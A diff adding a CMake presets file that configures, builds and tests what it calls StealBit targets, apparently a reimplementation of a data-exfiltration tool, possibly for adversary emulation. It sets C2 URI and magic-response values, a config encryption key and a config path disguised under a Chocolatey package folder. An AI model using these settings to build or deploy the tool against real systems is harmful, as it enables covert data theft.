@@ -1,0 +1,118 @@
+{
+  "version": 6,
+  "cmakeMinimumRequired": {
+    "major": 3,
+    "minor": 26,
+    "patch": 0
+  },
+  "configurePresets": [
+    {
+        "name": "default",
+        "binaryDir": "${sourceDir}/build",
+        "installDir": "${sourceDir}/install",
+        "generator": "Ninja Multi-Config",
+        "architecture": {
+            "value": "x64",
+            "strategy": "external"
+        },
+        "cacheVariables": {
+            "CMAKE_MODULE_PATH": "${sourceDir}/cmake",
+            "CMAKE_CXX_STANDARD": "26",
+            "CMAKE_C_STANDARD": "23",
+            "CMAKE_CONFIGURATION_TYPES": "Debug;Release;",
+            "CMAKE_MSVC_RUNTIME_LIBRARY": "MultiThreaded$<$<CONFIG:Debug>:Debug>"
+        },
+      "environment": {
+        "CTEST_OUTPUT_ON_FAILURE": "ON",
+        "CONFIG_FILE_NAME": "sb.conf",
+        "CONFIG_FILE_PATH": "C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\Connhost\\\\tools\\\\sb.conf",
+        "CONFIG_ENCRYPTION_KEY_BASE64": "DQAADQAADQAADQAA",
+        "DJB2_HASH_SEED": "12341234",
+        "C2_URI": "/bs/portal",
+        "C2_MAGIC_RESPONSE": "8bef61f7-2776-4e55-9ee4-409b6061d6f1"
+      },
+        "condition": {
+            "type": "equals",
+            "lhs": "${hostSystemName}",
+            "rhs": "Windows"
+        }
+    }
+  ],
+  "buildPresets": [
+    {
+      "name": "release",
+      "description": "Build StealBit targets with release configuration",
+      "configurePreset": "default",
+      "inheritConfigureEnvironment": true,
+      "configuration": "Release",
+      "targets": [
+        "connhost",
+        "stealbit-test",
+        "stealbit-encrypt-config"
+      ]
+    },
+    {
+      "name": "debug",
+      "description": "Build StealBit targets with debug configuration",
+      "configurePreset": "default",
+      "inheritConfigureEnvironment": true,
+      "configuration": "Debug",
+      "targets": [
+        "connhost",
+        "stealbit-test",
+        "stealbit-encrypt-config"
+      ]
+    }
+  ],
+  "testPresets": [
+    {
+        "name": "all",
+        "configurePreset": "default",
+        "configuration": "Debug",
+        "inheritConfigureEnvironment": true,
+        "output": {
+            "outputOnFailure": true
+        },
+        "execution": {
+        }
+    }
+  ],
+  "workflowPresets": [
+    {
+      "name": "cicd-debug",
+      "description": "Build all StealBit debug targets",
+      "steps": [
+        {
+          "type": "configure",
+          "name": "default"
+        },
+        {
+          "type": "build",
+          "name": "debug"
+        },
+        {
+          "type": "test",
+          "name": "all"
+        }
+      ]
+    },
+    {
+      "name": "cicd-release",
+      "description": "Build all StealBit release targets",
+      "steps": [
+        {
+          "type": "configure",
+          "name": "default"
+        },
+        {
+          "type": "build",
+          "name": "release"
+        },
+        {
+          "type": "test",
+          "name": "all"
+        }
+      ]
+    }
+  ]
+}
